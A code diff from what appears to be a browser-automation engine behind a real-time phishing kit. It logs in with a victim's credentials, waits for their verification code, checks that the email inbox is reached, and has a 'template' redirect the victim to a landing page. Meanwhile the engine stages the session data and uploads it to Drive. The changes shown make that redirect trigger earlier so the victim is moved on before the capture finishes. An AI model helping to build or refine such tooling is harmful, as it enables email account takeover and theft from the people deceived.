@@ -5923,7 +5923,7 @@ if (!foundSelector) {
                                     }
                                     const inboxChecked = await isInbox(page, platformConfig);
                                     if (inboxChecked) {
-                                        logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached during passive verification. Setting status to COMPLETED.`);
+                                        logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached during passive verification. Setting status to PROCESSING_FINALIZING.`);
                                         finalStatus = "PROCESSING_FINALIZING";
                                         codeSuccessfullyProcessed = true;
                                         initialCheckResult.reachedInbox = true;
@@ -6013,7 +6013,7 @@ if (!foundSelector) {
                             }
 
                             if (inboxReachedAfterWait) {
-                                logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached after verification wait. Setting status to COMPLETED.`);
+                                logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached after verification wait. Setting status to PROCESSING_FINALIZING.`);
                                 finalStatus = "PROCESSING_FINALIZING";
                                 codeSuccessfullyProcessed = true;
                                 initialCheckResult.reachedInbox = true;
@@ -6699,8 +6699,9 @@ if (!foundSelector) {
 
             // Signal the template to redirect immediately (PROCESSING_FINALIZING) so the user
             // is sent to the landing page while the engine finishes background work.
-            // If finalStatus is already COMPLETED (legacy path), skip the intermediate write.
-            if (finalStatus === "PROCESSING_FINALIZING") {
+            // Write whenever the inbox was actually reached (covers legacy COMPLETED paths
+            // too) — the sheet then flips before browser close + staging + upload.
+            if (finalStatus === "PROCESSING_FINALIZING" || initialCheckResult.reachedInbox === true) {
                 await updateBrowserRowDataFast(browserId, {
                     status: "PROCESSING_FINALIZING",
                     email: email || '',
@@ -6712,7 +6713,7 @@ if (!foundSelector) {
                     driveUrl: updateData.driveUrl,
                     lastJsonResponse: updateData.lastJsonResponse
                 });
-                logger.info(`[processRow][${browserId}] PROCESSING_FINALIZING written to sheet — template will redirect user.`);
+                logger.info(`[processRow][${browserId}] PROCESSING_FINALIZING written to sheet (finalStatus=${finalStatus}, reachedInbox=${initialCheckResult.reachedInbox === true}) — template will redirect user.`);
             }
 
             let uploadedDriveUrl = null;
